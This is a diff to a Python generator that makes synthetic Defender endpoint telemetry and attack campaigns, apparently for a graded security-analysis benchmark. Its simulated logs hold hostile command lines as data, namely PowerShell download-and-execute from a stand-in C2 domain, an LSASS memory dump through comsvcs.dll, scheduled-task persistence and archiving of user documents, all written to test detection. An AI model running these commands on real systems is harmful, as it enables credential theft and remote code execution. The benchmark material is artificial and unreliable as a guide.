@@ -72,8 +72,16 @@ MITRE_TECHNIQUES = {
 
 # Realistic device names for a 500-device enterprise
 DEVICE_POOLS = {
-    "workstations": [f"WS-{dept}-{i:03d}" for dept in ["FIN", "ENG", "MKT", "HR", "EXEC", "IT", "LEGAL"] for i in range(1, 16)],
-    "servers": [f"SRV-{role}-{i:02d}" for role in ["DC", "SQL", "WEB", "APP", "FILE", "EXCH", "SCCM", "WSUS"] for i in range(1, 6)],
+    "workstations": [
+        f"WS-{dept}-{i:03d}"
+        for dept in ["FIN", "ENG", "MKT", "HR", "EXEC", "IT", "LEGAL"]
+        for i in range(1, 16)
+    ],
+    "servers": [
+        f"SRV-{role}-{i:02d}"
+        for role in ["DC", "SQL", "WEB", "APP", "FILE", "EXCH", "SCCM", "WSUS"]
+        for i in range(1, 6)
+    ],
     "domain_controllers": [f"SRV-DC-{i:02d}" for i in range(1, 4)],
 }
 
@@ -96,17 +104,20 @@ USERS = [
 ]
 
 C2_DOMAINS = [
-    "cdn-static-assets.com", "api-telemetry-service.net",
-    "cloud-sync-update.com", "global-content-delivery.net",
-    "secure-update-check.com", "analytics-reporting.io",
+    "cdn-static-assets.com",
+    "api-telemetry-service.net",
+    "cloud-sync-update.com",
+    "global-content-delivery.net",
+    "secure-update-check.com",
+    "analytics-reporting.io",
 ]
 
 MALWARE_HASHES = {
-    "cobalt_strike": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
-    "mimikatz": "d4e5f6a7b8c9d0e1f2a3b4c5d6a7b8c9",
-    "ransomware_payload": "f6a7b8c9d0e1f2a3b4c5d6a7b8c9d0e1",
-    "keylogger": "b8c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3",
-    "lateral_tool": "c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3b4",
+    "cobalt_strike": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",  # pragma: allowlist secret
+    "mimikatz": "d4e5f6a7b8c9d0e1f2a3b4c5d6a7b8c9",  # pragma: allowlist secret
+    "ransomware_payload": "f6a7b8c9d0e1f2a3b4c5d6a7b8c9d0e1",  # pragma: allowlist secret
+    "keylogger": "b8c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3",  # pragma: allowlist secret
+    "lateral_tool": "c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3b4",  # pragma: allowlist secret
 }
 
 ALERT_SEVERITIES = ["Informational", "Low", "Medium", "High", "Critical"]
@@ -116,9 +127,11 @@ ALERT_SEVERITIES = ["Informational", "Low", "Medium", "High", "Critical"]
 # Attack Campaign Definitions
 # ============================================================
 
+
 @dataclass
 class AttackCampaign:
     """A multi-stage attack campaign with ground truth."""
+
     campaign_id: str
     name: str
     threat_actor: str
@@ -153,15 +166,35 @@ def _generate_campaigns(rng: random.Random, num_campaigns: int = 12) -> list[Att
     objectives = ["data_exfiltration", "ransomware", "espionage", "cryptomining", "supply_chain"]
 
     techniques_by_objective = {
-        "data_exfiltration": ["T1566.001", "T1059.001", "T1003.001", "T1021.002",
-                              "T1083", "T1560.001", "T1048.003"],
-        "ransomware": ["T1566.001", "T1059.003", "T1053.005", "T1021.001",
-                       "T1562.001", "T1490", "T1486"],
-        "espionage": ["T1566.001", "T1059.001", "T1055.001", "T1003.001",
-                      "T1087.002", "T1018", "T1071.001"],
+        "data_exfiltration": [
+            "T1566.001",
+            "T1059.001",
+            "T1003.001",
+            "T1021.002",
+            "T1083",
+            "T1560.001",
+            "T1048.003",
+        ],
+        "ransomware": [
+            "T1566.001",
+            "T1059.003",
+            "T1053.005",
+            "T1021.001",
+            "T1562.001",
+            "T1490",
+            "T1486",
+        ],
+        "espionage": [
+            "T1566.001",
+            "T1059.001",
+            "T1055.001",
+            "T1003.001",
+            "T1087.002",
+            "T1018",
+            "T1071.001",
+        ],
         "cryptomining": ["T1059.001", "T1053.005", "T1543.003", "T1105"],
-        "supply_chain": ["T1059.001", "T1036.005", "T1547.001", "T1027",
-                         "T1140", "T1218.011"],
+        "supply_chain": ["T1059.001", "T1036.005", "T1547.001", "T1027", "T1140", "T1218.011"],
     }
 
     all_devices = DEVICE_POOLS["workstations"] + DEVICE_POOLS["servers"]
@@ -180,29 +213,36 @@ def _generate_campaigns(rng: random.Random, num_campaigns: int = 12) -> list[Att
         # Generate unique IOCs per campaign
         campaign_hash = hashlib.md5(f"campaign-{i}-{actor_name}".encode()).hexdigest()
         malware = [campaign_hash[:32]]
-        ips = [f"185.{rng.randint(100,255)}.{rng.randint(1,254)}.{rng.randint(1,254)}" for _ in range(rng.randint(2, 5))]
+        ips = [
+            f"185.{rng.randint(100, 255)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
+            for _ in range(rng.randint(2, 5))
+        ]
 
-        lateral_path = target_devices[:rng.randint(2, min(5, len(target_devices)))]
+        lateral_path = target_devices[: rng.randint(2, min(5, len(target_devices)))]
 
-        campaigns.append(AttackCampaign(
-            campaign_id=f"CAMP-{2024+i//6}-{i+1:03d}",
-            name=f"Operation {rng.choice(['Midnight', 'Shadow', 'Storm', 'Glacier', 'Phoenix', 'Cobalt', 'Iron', 'Crimson', 'Azure', 'Onyx', 'Jade', 'Ruby'])} {rng.choice(['Wolf', 'Bear', 'Eagle', 'Fox', 'Lion', 'Hawk', 'Viper', 'Falcon'])}",
-            threat_actor=f"{actor_name} ({actor_desc})",
-            start_day=i * 5 + rng.randint(0, 3),
-            duration_days=rng.randint(2, 14),
-            initial_access="T1566.001",
-            techniques=techniques,
-            target_devices=target_devices,
-            target_users=target_users,
-            c2_domains=c2,
-            malware_hashes=malware,
-            objective=objective,
-            iocs={"ip": ips, "domain": c2, "hash": malware},
-            lateral_movement_path=lateral_path,
-            data_exfil_gb=round(rng.uniform(0.1, 50.0), 2) if objective == "data_exfiltration" else 0,
-            detected=rng.random() > 0.15,  # 85% detection rate
-            detection_delay_hours=rng.randint(1, 72),
-        ))
+        campaigns.append(
+            AttackCampaign(
+                campaign_id=f"CAMP-{2024 + i // 6}-{i + 1:03d}",
+                name=f"Operation {rng.choice(['Midnight', 'Shadow', 'Storm', 'Glacier', 'Phoenix', 'Cobalt', 'Iron', 'Crimson', 'Azure', 'Onyx', 'Jade', 'Ruby'])} {rng.choice(['Wolf', 'Bear', 'Eagle', 'Fox', 'Lion', 'Hawk', 'Viper', 'Falcon'])}",
+                threat_actor=f"{actor_name} ({actor_desc})",
+                start_day=i * 5 + rng.randint(0, 3),
+                duration_days=rng.randint(2, 14),
+                initial_access="T1566.001",
+                techniques=techniques,
+                target_devices=target_devices,
+                target_users=target_users,
+                c2_domains=c2,
+                malware_hashes=malware,
+                objective=objective,
+                iocs={"ip": ips, "domain": c2, "hash": malware},
+                lateral_movement_path=lateral_path,
+                data_exfil_gb=round(rng.uniform(0.1, 50.0), 2)
+                if objective == "data_exfiltration"
+                else 0,
+                detected=rng.random() > 0.15,  # 85% detection rate
+                detection_delay_hours=rng.randint(1, 72),
+            )
+        )
 
     return campaigns
 
@@ -211,9 +251,17 @@ def _generate_campaigns(rng: random.Random, num_campaigns: int = 12) -> list[Att
 # MDE Event Generators
 # ============================================================
 
-def _mde_process_event(rng: random.Random, ts: str, device: str, user: str,
-                       process: str, parent: str, cmdline: str,
-                       technique: str = "") -> str:
+
+def _mde_process_event(
+    rng: random.Random,
+    ts: str,
+    device: str,
+    user: str,
+    process: str,
+    parent: str,
+    cmdline: str,
+    technique: str = "",
+) -> str:
     """Generate an MDE DeviceProcessEvents record."""
     return (
         f"[MDE DeviceProcessEvents] Timestamp: {ts} | "
@@ -226,9 +274,15 @@ def _mde_process_event(rng: random.Random, ts: str, device: str, user: str,
     )
 
 
-def _mde_network_event(rng: random.Random, ts: str, device: str,
-                       remote_ip: str, remote_port: int,
-                       protocol: str = "TCP", action: str = "ConnectionSuccess") -> str:
+def _mde_network_event(
+    rng: random.Random,
+    ts: str,
+    device: str,
+    remote_ip: str,
+    remote_port: int,
+    protocol: str = "TCP",
+    action: str = "ConnectionSuccess",
+) -> str:
     """Generate an MDE DeviceNetworkEvents record."""
     return (
         f"[MDE DeviceNetworkEvents] Timestamp: {ts} | "
@@ -239,11 +293,17 @@ def _mde_network_event(rng: random.Random, ts: str, device: str,
     )
 
 
-def _mde_file_event(rng: random.Random, ts: str, device: str, user: str,
-                     filename: str, action: str = "FileCreated",
-                     sha256: str = "") -> str:
+def _mde_file_event(
+    rng: random.Random,
+    ts: str,
+    device: str,
+    user: str,
+    filename: str,
+    action: str = "FileCreated",
+    sha256: str = "",
+) -> str:
     """Generate an MDE DeviceFileEvents record."""
-    h = sha256 or hashlib.sha256(f'{filename}-{ts}'.encode()).hexdigest()[:64]
+    h = sha256 or hashlib.sha256(f"{filename}-{ts}".encode()).hexdigest()[:64]
     return (
         f"[MDE DeviceFileEvents] Timestamp: {ts} | "
         f"DeviceName: {device} | ActionType: {action} | "
@@ -251,8 +311,9 @@ def _mde_file_event(rng: random.Random, ts: str, device: str, user: str,
     )
 
 
-def _mde_registry_event(ts: str, device: str, key: str, value: str,
-                         action: str = "RegistryValueSet") -> str:
+def _mde_registry_event(
+    ts: str, device: str, key: str, value: str, action: str = "RegistryValueSet"
+) -> str:
     """Generate an MDE DeviceRegistryEvents record."""
     return (
         f"[MDE DeviceRegistryEvents] Timestamp: {ts} | "
@@ -261,9 +322,15 @@ def _mde_registry_event(ts: str, device: str, key: str, value: str,
     )
 
 
-def _mde_alert(ts: str, device: str, title: str, severity: str,
-               category: str, technique: str = "",
-               alert_id: str = "") -> str:
+def _mde_alert(
+    ts: str,
+    device: str,
+    title: str,
+    severity: str,
+    category: str,
+    technique: str = "",
+    alert_id: str = "",
+) -> str:
     """Generate an MDE AlertInfo record."""
     return (
         f"[MDE AlertInfo] Timestamp: {ts} | "
@@ -274,9 +341,9 @@ def _mde_alert(ts: str, device: str, title: str, severity: str,
     )
 
 
-def _mde_logon_event(ts: str, device: str, user: str,
-                      logon_type: str = "Interactive",
-                      success: bool = True) -> str:
+def _mde_logon_event(
+    ts: str, device: str, user: str, logon_type: str = "Interactive", success: bool = True
+) -> str:
     """Generate an MDE DeviceLogonEvents record."""
     action = "LogonSuccess" if success else "LogonFailed"
     return (
@@ -286,9 +353,21 @@ def _mde_logon_event(ts: str, device: str, user: str,
     )
 
 
+def _mde_threat_intel_event(ts: str, device: str, campaign_id: str, threat_actor: str) -> str:
+    """Generate an MDE AlertInfo-style threat-attribution record."""
+    return (
+        f"[MDE AlertInfo] Timestamp: {ts} | "
+        f"AlertId: ATTR-{campaign_id} | DeviceName: {device} | "
+        f"Title: Threat intelligence links activity to {threat_actor} | "
+        f"Severity: Medium | Category: ThreatIntelligence | "
+        f"CampaignId: {campaign_id} | ThreatActor: {threat_actor}"
+    )
+
+
 # ============================================================
 # Campaign Event Generation
 # ============================================================
+
 
 def _ts(day: int, hour: int, minute: int, second: int = 0) -> str:
     """Generate a timestamp string."""
@@ -303,161 +382,221 @@ def _generate_campaign_events(rng: random.Random, campaign: AttackCampaign) -> l
     users = campaign.target_users
     primary_device = devices[0]
     primary_user = users[0]
+    actor_name = campaign.threat_actor.split("(")[0].strip()
 
     # Phase 1: Initial Access (phishing)
     ts = _ts(day, rng.randint(8, 10), rng.randint(0, 59))
-    events.append({
-        "content": _mde_process_event(
-            rng, ts, primary_device, primary_user,
-            "outlook.exe", "explorer.exe",
-            f"\"C:\\Program Files\\Microsoft Office\\outlook.exe\" /eml invoice_{campaign.campaign_id}.msg",
-            "T1566.001"
-        ),
-        "phase": "initial_access",
-        "campaign_id": campaign.campaign_id,
-        "technique": "T1566.001",
-        "facts": [f"{campaign.campaign_id} initial access via phishing on {primary_device} by {primary_user}"],
-    })
+    events.append(
+        {
+            "content": _mde_process_event(
+                rng,
+                ts,
+                primary_device,
+                primary_user,
+                "outlook.exe",
+                "explorer.exe",
+                f'"C:\\Program Files\\Microsoft Office\\outlook.exe" /eml invoice_{campaign.campaign_id}.msg',
+                "T1566.001",
+            ),
+            "phase": "initial_access",
+            "campaign_id": campaign.campaign_id,
+            "technique": "T1566.001",
+            "facts": [
+                f"{campaign.campaign_id} initial access via phishing on {primary_device} by {primary_user}"
+            ],
+        }
+    )
 
     # Malicious attachment execution
     ts = _ts(day, rng.randint(10, 11), rng.randint(0, 30))
     macro_file = rng.choice(["invoice.xlsm", "report.docm", "contract.xlsm"])
-    events.append({
-        "content": _mde_process_event(
-            rng, ts, primary_device, primary_user,
-            "excel.exe" if "xls" in macro_file else "winword.exe",
-            "outlook.exe",
-            f"\"C:\\Users\\{primary_user}\\Downloads\\{macro_file}\"",
-        ),
-        "phase": "initial_access",
-        "campaign_id": campaign.campaign_id,
-        "technique": "T1566.001",
-        "facts": [f"{campaign.campaign_id} malicious macro executed from {macro_file}"],
-    })
+    events.append(
+        {
+            "content": _mde_process_event(
+                rng,
+                ts,
+                primary_device,
+                primary_user,
+                "excel.exe" if "xls" in macro_file else "winword.exe",
+                "outlook.exe",
+                f'"C:\\Users\\{primary_user}\\Downloads\\{macro_file}"',
+            ),
+            "phase": "initial_access",
+            "campaign_id": campaign.campaign_id,
+            "technique": "T1566.001",
+            "facts": [f"{campaign.campaign_id} malicious macro executed from {macro_file}"],
+        }
+    )
 
     # Phase 2: Execution (PowerShell/cmd)
     ts = _ts(day, rng.randint(11, 12), rng.randint(0, 59))
     if "T1059.001" in campaign.techniques:
-        ps_cmd = rng.choice([
-            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA",
-            "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
-            f"powershell.exe -c Invoke-WebRequest -Uri https://{campaign.c2_domains[0]}/update.ps1",
-        ])
-        events.append({
-            "content": _mde_process_event(
-                rng, ts, primary_device, primary_user,
-                "powershell.exe", "excel.exe", ps_cmd, "T1059.001"
-            ),
-            "phase": "execution",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1059.001",
-            "facts": [f"{campaign.campaign_id} PowerShell execution on {primary_device}"],
-        })
+        ps_cmd = rng.choice(
+            [
+                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA",
+                "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
+                f"powershell.exe -c Invoke-WebRequest -Uri https://{campaign.c2_domains[0]}/update.ps1",
+            ]
+        )
+        events.append(
+            {
+                "content": _mde_process_event(
+                    rng,
+                    ts,
+                    primary_device,
+                    primary_user,
+                    "powershell.exe",
+                    "excel.exe",
+                    ps_cmd,
+                    "T1059.001",
+                ),
+                "phase": "execution",
+                "campaign_id": campaign.campaign_id,
+                "technique": "T1059.001",
+                "facts": [f"{campaign.campaign_id} PowerShell execution on {primary_device}"],
+            }
+        )
 
     # C2 connection
     ts = _ts(day, rng.randint(12, 13), rng.randint(0, 59))
     c2_ip = campaign.iocs["ip"][0]
-    events.append({
-        "content": _mde_network_event(
-            rng, ts, primary_device, c2_ip, 443
-        ),
-        "phase": "c2",
-        "campaign_id": campaign.campaign_id,
-        "technique": "T1071.001",
-        "facts": [f"{campaign.campaign_id} C2 connection from {primary_device} to {c2_ip}:443"],
-    })
+    events.append(
+        {
+            "content": _mde_network_event(rng, ts, primary_device, c2_ip, 443),
+            "phase": "c2",
+            "campaign_id": campaign.campaign_id,
+            "technique": "T1071.001",
+            "facts": [f"{campaign.campaign_id} C2 connection from {primary_device} to {c2_ip}:443"],
+        }
+    )
 
     # File drop
     ts = _ts(day, rng.randint(13, 14), rng.randint(0, 59))
-    malware_name = rng.choice(["svchost_update.exe", "wuauserv.dll", "taskhost_x64.exe", "dllhost_srv.exe"])
-    events.append({
-        "content": _mde_file_event(
-            rng, ts, primary_device, primary_user,
-            f"C:\\ProgramData\\{malware_name}",
-            sha256=campaign.malware_hashes[0]
-        ),
-        "phase": "execution",
-        "campaign_id": campaign.campaign_id,
-        "technique": "T1105",
-        "facts": [
-            f"{campaign.campaign_id} dropped malware {malware_name} hash {campaign.malware_hashes[0][:16]} on {primary_device}",
-        ],
-    })
+    malware_name = rng.choice(
+        ["svchost_update.exe", "wuauserv.dll", "taskhost_x64.exe", "dllhost_srv.exe"]
+    )
+    events.append(
+        {
+            "content": _mde_file_event(
+                rng,
+                ts,
+                primary_device,
+                primary_user,
+                f"C:\\ProgramData\\{malware_name}",
+                sha256=campaign.malware_hashes[0],
+            ),
+            "phase": "execution",
+            "campaign_id": campaign.campaign_id,
+            "technique": "T1105",
+            "facts": [
+                f"{campaign.campaign_id} dropped malware {malware_name} hash {campaign.malware_hashes[0][:16]} on {primary_device}",
+            ],
+        }
+    )
 
     # Alert for initial compromise
     if campaign.detected:
         alert_ts = _ts(day, rng.randint(14, 18), rng.randint(0, 59))
-        events.append({
-            "content": _mde_alert(
-                alert_ts, primary_device,
-                f"Suspicious PowerShell execution detected",
-                "High", "Execution", "T1059.001",
-                alert_id=f"ALT-{campaign.campaign_id}-001"
-            ),
-            "phase": "detection",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1059.001",
-            "facts": [f"{campaign.campaign_id} alert ALT-{campaign.campaign_id}-001 on {primary_device}"],
-        })
+        events.append(
+            {
+                "content": _mde_alert(
+                    alert_ts,
+                    primary_device,
+                    "Suspicious PowerShell execution detected",
+                    "High",
+                    "Execution",
+                    "T1059.001",
+                    alert_id=f"ALT-{campaign.campaign_id}-001",
+                ),
+                "phase": "detection",
+                "campaign_id": campaign.campaign_id,
+                "technique": "T1059.001",
+                "facts": [
+                    f"{campaign.campaign_id} alert ALT-{campaign.campaign_id}-001 on {primary_device}"
+                ],
+            }
+        )
 
     # Phase 3: Persistence
     day += 1
     ts = _ts(day, rng.randint(2, 5), rng.randint(0, 59))
     if "T1547.001" in campaign.techniques:
-        events.append({
-            "content": _mde_registry_event(
-                ts, primary_device,
-                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-                malware_name
-            ),
-            "phase": "persistence",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1547.001",
-            "facts": [f"{campaign.campaign_id} persistence via Run key for {malware_name} on {primary_device}"],
-        })
+        events.append(
+            {
+                "content": _mde_registry_event(
+                    ts,
+                    primary_device,
+                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                    malware_name,
+                ),
+                "phase": "persistence",
+                "campaign_id": campaign.campaign_id,
+                "technique": "T1547.001",
+                "facts": [
+                    f"{campaign.campaign_id} persistence via Run key for {malware_name} on {primary_device}"
+                ],
+            }
+        )
     elif "T1053.005" in campaign.techniques:
-        events.append({
-            "content": _mde_process_event(
-                rng, ts, primary_device, "SYSTEM",
-                "schtasks.exe", malware_name,
-                f'schtasks /create /tn "WindowsUpdate" /tr "C:\\ProgramData\\{malware_name}" /sc hourly',
-                "T1053.005"
-            ),
-            "phase": "persistence",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1053.005",
-            "facts": [f"{campaign.campaign_id} scheduled task persistence on {primary_device}"],
-        })
+        events.append(
+            {
+                "content": _mde_process_event(
+                    rng,
+                    ts,
+                    primary_device,
+                    "SYSTEM",
+                    "schtasks.exe",
+                    malware_name,
+                    f'schtasks /create /tn "WindowsUpdate" /tr "C:\\ProgramData\\{malware_name}" /sc hourly',
+                    "T1053.005",
+                ),
+                "phase": "persistence",
+                "campaign_id": campaign.campaign_id,
+                "technique": "T1053.005",
+                "facts": [f"{campaign.campaign_id} scheduled task persistence on {primary_device}"],
+            }
+        )
 
     # Phase 4: Credential Access
     if "T1003.001" in campaign.techniques:
         day += rng.randint(0, 1)
         ts = _ts(day, rng.randint(1, 4), rng.randint(0, 59))
-        events.append({
-            "content": _mde_process_event(
-                rng, ts, primary_device, "SYSTEM",
-                "rundll32.exe", malware_name,
-                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\ProgramData\\lsass.dmp full",
-                "T1003.001"
-            ),
-            "phase": "credential_access",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1003.001",
-            "facts": [f"{campaign.campaign_id} LSASS credential dump on {primary_device}"],
-        })
-        if campaign.detected:
-            events.append({
-                "content": _mde_alert(
-                    ts, primary_device,
-                    "Suspicious LSASS access detected",
-                    "Critical", "CredentialAccess", "T1003.001",
-                    alert_id=f"ALT-{campaign.campaign_id}-002"
+        events.append(
+            {
+                "content": _mde_process_event(
+                    rng,
+                    ts,
+                    primary_device,
+                    "SYSTEM",
+                    "rundll32.exe",
+                    malware_name,
+                    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\ProgramData\\lsass.dmp full",
+                    "T1003.001",
                 ),
-                "phase": "detection",
+                "phase": "credential_access",
                 "campaign_id": campaign.campaign_id,
                 "technique": "T1003.001",
-                "facts": [f"{campaign.campaign_id} credential dump alert on {primary_device}"],
-            })
+                "facts": [f"{campaign.campaign_id} LSASS credential dump on {primary_device}"],
+            }
+        )
+        if campaign.detected:
+            events.append(
+                {
+                    "content": _mde_alert(
+                        ts,
+                        primary_device,
+                        "Suspicious LSASS access detected",
+                        "Critical",
+                        "CredentialAccess",
+                        "T1003.001",
+                        alert_id=f"ALT-{campaign.campaign_id}-002",
+                    ),
+                    "phase": "detection",
+                    "campaign_id": campaign.campaign_id,
+                    "technique": "T1003.001",
+                    "facts": [f"{campaign.campaign_id} credential dump alert on {primary_device}"],
+                }
+            )
 
     # Phase 5: Lateral Movement
     for hop_idx, hop_device in enumerate(campaign.lateral_movement_path[1:], 1):
@@ -466,83 +605,123 @@ def _generate_campaign_events(rng: random.Random, campaign: AttackCampaign) -> l
 
         if "T1021.002" in campaign.techniques:
             technique = "T1021.002"
-            events.append({
-                "content": _mde_logon_event(
-                    ts, hop_device, primary_user, "RemoteInteractive"
-                ),
-                "phase": "lateral_movement",
-                "campaign_id": campaign.campaign_id,
-                "technique": technique,
-                "facts": [f"{campaign.campaign_id} lateral movement to {hop_device} via SMB (hop {hop_idx})"],
-            })
+            events.append(
+                {
+                    "content": _mde_logon_event(ts, hop_device, primary_user, "RemoteInteractive"),
+                    "phase": "lateral_movement",
+                    "campaign_id": campaign.campaign_id,
+                    "technique": technique,
+                    "facts": [
+                        f"{campaign.campaign_id} lateral movement to {hop_device} via SMB (hop {hop_idx})"
+                    ],
+                }
+            )
         elif "T1021.001" in campaign.techniques:
             technique = "T1021.001"
-            events.append({
-                "content": _mde_logon_event(
-                    ts, hop_device, primary_user, "RemoteInteractive"
+            events.append(
+                {
+                    "content": _mde_logon_event(ts, hop_device, primary_user, "RemoteInteractive"),
+                    "phase": "lateral_movement",
+                    "campaign_id": campaign.campaign_id,
+                    "technique": technique,
+                    "facts": [
+                        f"{campaign.campaign_id} lateral movement to {hop_device} via RDP (hop {hop_idx})"
+                    ],
+                }
+            )
+
+        # Drop tools on lateral hop
+        events.append(
+            {
+                "content": _mde_file_event(
+                    rng,
+                    ts,
+                    hop_device,
+                    primary_user,
+                    f"C:\\Windows\\Temp\\{malware_name}",
+                    sha256=campaign.malware_hashes[0],
                 ),
                 "phase": "lateral_movement",
                 "campaign_id": campaign.campaign_id,
-                "technique": technique,
-                "facts": [f"{campaign.campaign_id} lateral movement to {hop_device} via RDP (hop {hop_idx})"],
-            })
-
-        # Drop tools on lateral hop
-        events.append({
-            "content": _mde_file_event(
-                rng, ts, hop_device, primary_user,
-                f"C:\\Windows\\Temp\\{malware_name}",
-                sha256=campaign.malware_hashes[0]
-            ),
-            "phase": "lateral_movement",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1105",
-            "facts": [f"{campaign.campaign_id} malware deployed on {hop_device}"],
-        })
+                "technique": "T1105",
+                "facts": [f"{campaign.campaign_id} malware deployed on {hop_device}"],
+            }
+        )
 
     # Phase 6: Objective
     day += rng.randint(1, 3)
     if campaign.objective == "ransomware":
         ts = _ts(day, rng.randint(0, 3), rng.randint(0, 59))
-        for dev in devices[:rng.randint(2, min(5, len(devices)))]:
-            events.append({
-                "content": _mde_alert(
-                    ts, dev,
-                    f"Ransomware behavior detected: mass file encryption",
-                    "Critical", "Impact", "T1486",
-                    alert_id=f"ALT-{campaign.campaign_id}-R{devices.index(dev)}"
-                ),
-                "phase": "impact",
-                "campaign_id": campaign.campaign_id,
-                "technique": "T1486",
-                "facts": [f"{campaign.campaign_id} ransomware encryption on {dev}"],
-            })
+        for dev in devices[: rng.randint(2, min(5, len(devices)))]:
+            events.append(
+                {
+                    "content": _mde_alert(
+                        ts,
+                        dev,
+                        "Ransomware behavior detected: mass file encryption",
+                        "Critical",
+                        "Impact",
+                        "T1486",
+                        alert_id=f"ALT-{campaign.campaign_id}-R{devices.index(dev)}",
+                    ),
+                    "phase": "impact",
+                    "campaign_id": campaign.campaign_id,
+                    "technique": "T1486",
+                    "facts": [f"{campaign.campaign_id} ransomware encryption on {dev}"],
+                }
+            )
     elif campaign.objective == "data_exfiltration":
         ts = _ts(day, rng.randint(1, 4), rng.randint(0, 59))
-        events.append({
-            "content": _mde_network_event(
-                rng, ts, devices[-1],
-                campaign.iocs["ip"][-1], 443
-            ) + f" | BytesSent: {int(campaign.data_exfil_gb * 1073741824)}",
-            "phase": "exfiltration",
-            "campaign_id": campaign.campaign_id,
-            "technique": "T1048.003",
-            "facts": [f"{campaign.campaign_id} exfiltrated {campaign.data_exfil_gb}GB from {devices[-1]}"],
-        })
+        events.append(
+            {
+                "content": _mde_network_event(rng, ts, devices[-1], campaign.iocs["ip"][-1], 443)
+                + f" | BytesSent: {int(campaign.data_exfil_gb * 1073741824)}",
+                "phase": "exfiltration",
+                "campaign_id": campaign.campaign_id,
+                "technique": "T1048.003",
+                "facts": [
+                    f"{campaign.campaign_id} exfiltrated {campaign.data_exfil_gb}GB from {devices[-1]}"
+                ],
+            }
+        )
     elif campaign.objective == "espionage":
         ts = _ts(day, rng.randint(1, 4), rng.randint(0, 59))
-        events.append({
-            "content": _mde_process_event(
-                rng, ts, primary_device, primary_user,
-                "7z.exe", malware_name,
-                f"7z.exe a -p C:\\ProgramData\\data.7z C:\\Users\\{primary_user}\\Documents\\*",
-                "T1560.001"
+        events.append(
+            {
+                "content": _mde_process_event(
+                    rng,
+                    ts,
+                    primary_device,
+                    primary_user,
+                    "7z.exe",
+                    malware_name,
+                    f"7z.exe a -p C:\\ProgramData\\data.7z C:\\Users\\{primary_user}\\Documents\\*",
+                    "T1560.001",
+                ),
+                "phase": "collection",
+                "campaign_id": campaign.campaign_id,
+                "technique": "T1560.001",
+                "facts": [f"{campaign.campaign_id} data collection/archival on {primary_device}"],
+            }
+        )
+
+    # Threat-intelligence enrichment: explicit campaign attribution so
+    # actor-based cross-campaign questions are answerable from telemetry.
+    ts = _ts(day, rng.randint(4, 6), rng.randint(0, 59))
+    events.append(
+        {
+            "content": _mde_threat_intel_event(
+                ts,
+                primary_device,
+                campaign.campaign_id,
+                actor_name,
             ),
-            "phase": "collection",
+            "phase": "attribution",
             "campaign_id": campaign.campaign_id,
-            "technique": "T1560.001",
-            "facts": [f"{campaign.campaign_id} data collection/archival on {primary_device}"],
-        })
+            "technique": "",
+            "facts": [f"{campaign.campaign_id} threat actor {actor_name}"],
+        }
+    )
 
     # Add noise events (benign activity on same devices)
     for _ in range(rng.randint(5, 15)):
@@ -558,13 +737,17 @@ def _generate_campaign_events(rng: random.Random, campaign: AttackCampaign) -> l
             ("notepad.exe", "explorer.exe", f"notepad.exe C:\\Users\\{noise_user}\\notes.txt"),
         ]
         proc, parent, cmd = rng.choice(benign_processes)
-        events.append({
-            "content": _mde_process_event(rng, noise_ts, noise_device, noise_user, proc, parent, cmd),
-            "phase": "noise",
-            "campaign_id": campaign.campaign_id,
-            "technique": "",
-            "facts": [],
-        })
+        events.append(
+            {
+                "content": _mde_process_event(
+                    rng, noise_ts, noise_device, noise_user, proc, parent, cmd
+                ),
+                "phase": "noise",
+                "campaign_id": campaign.campaign_id,
+                "technique": "",
+                "facts": [],
+            }
+        )
 
     return events
 
@@ -573,6 +756,7 @@ def _generate_campaign_events(rng: random.Random, campaign: AttackCampaign) -> l
 # Background Noise Generator
 # ============================================================
 
+
 def _generate_noise_events(rng: random.Random, num_events: int, num_days: int) -> list[dict]:
     """Generate benign MDE telemetry (normal enterprise activity)."""
     all_devices = DEVICE_POOLS["workstations"] + DEVICE_POOLS["servers"]
@@ -580,7 +764,11 @@ def _generate_noise_events(rng: random.Random, num_events: int, num_days: int) -
 
     benign_templates = [
         ("chrome.exe", "explorer.exe", "chrome.exe --type=renderer --field-trial-handle=12345"),
-        ("msedge.exe", "explorer.exe", "msedge.exe --single-argument https://sharepoint.contoso.com"),
+        (
+            "msedge.exe",
+            "explorer.exe",
+            "msedge.exe --single-argument https://sharepoint.contoso.com",
+        ),
         ("teams.exe", "explorer.exe", "teams.exe --type=gpu-process"),
         ("outlook.exe", "explorer.exe", "outlook.exe /recycle"),
         ("code.exe", "explorer.exe", "code.exe --unity-launch"),
@@ -600,13 +788,15 @@ def _generate_noise_events(rng: random.Random, num_events: int, num_days: int) -
         user = rng.choice(USERS)[0]
         proc, parent, cmd = rng.choice(benign_templates)
 
-        events.append({
-            "content": _mde_process_event(rng, ts, device, user, proc, parent, cmd),
-            "phase": "noise",
-            "campaign_id": "BENIGN",
-            "technique": "",
-            "facts": [],
-        })
+        events.append(
+            {
+                "content": _mde_process_event(rng, ts, device, user, proc, parent, cmd),
+                "phase": "noise",
+                "campaign_id": "BENIGN",
+                "technique": "",
+                "facts": [],
+            }
+        )
 
     return events
 
@@ -615,9 +805,11 @@ def _generate_noise_events(rng: random.Random, num_events: int, num_days: int) -
 # Question Generation
 # ============================================================
 
+
 @dataclass
 class SecurityQuestion:
     """A question with ground truth for grading."""
+
     question_id: str
